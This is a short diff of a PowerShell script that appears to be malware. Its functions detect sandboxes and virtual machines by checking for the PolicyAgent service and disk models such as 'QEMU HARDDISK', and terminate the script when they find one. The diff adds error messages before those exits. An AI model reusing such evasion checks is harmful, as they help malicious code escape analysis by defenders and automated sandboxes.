@@ -26,7 +26,7 @@ function InternetCheck {
 	Stop-Process $pid -Force
     }
 }
- 
+
 
 function ProcessCountCheck {
     $processes = gps | Measure-Object | Select-Object -ExpandProperty Count
@@ -125,11 +125,13 @@ function ram_check {
 function VMPROTECT {
 	ram_check	  
 	if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
+        ShowError "PolicyAgent"
         Stop-Process $pid -Force
     } 	
     #triage detection
     $d = wmic diskdrive get model
-    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {  
+    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") { 
+        ShowError "QEMU HARDDISK" 
         Stop-Process $pid -Force   
     }	
     $processNames = @(
